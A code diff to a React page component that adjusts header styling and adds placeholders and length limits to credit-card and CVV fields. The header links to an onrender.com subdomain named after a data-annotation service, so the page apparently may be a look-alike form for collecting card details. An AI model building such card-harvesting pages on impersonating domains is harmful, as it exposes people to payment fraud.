@@ -167,8 +167,8 @@ export default function Main() {
             zIndex: 9999,
          }}
       >
-         <div className="md:flex  justify-between items-center text-white py-2 px-[20%] bg-black">
-            <div className="flex flex-col font-bold text-[25px]">
+         <div className="md:flex justify-between items-center text-white py-2 px-[20%] bg-black">
+            <div className="md:flex font-bold text-[25px]">
                <a href='https://dataannotation-dg92.onrender.com'><img src="assets/data.jpg" alt="Data" /></a>
             </div>
             <div className="space-x-4 space-y-10 text-xs">
@@ -415,6 +415,8 @@ export default function Main() {
                      type="text"
                      value={formData.creditCard}
                      onChange={handleInputChange}
+                     placeholder='1234 5678 9101 1213'
+                     maxLength={16}
                      className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                   />
                   <div className="flex w-full space-x-5">
@@ -448,6 +450,9 @@ export default function Main() {
                            type="password"
                            value={formData.cvv}
                            onChange={handleInputChange}
+                           placeholder='XXX'
+                           minLength={3}
+                           maxLength={4}
                            className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                         />
                      </div>
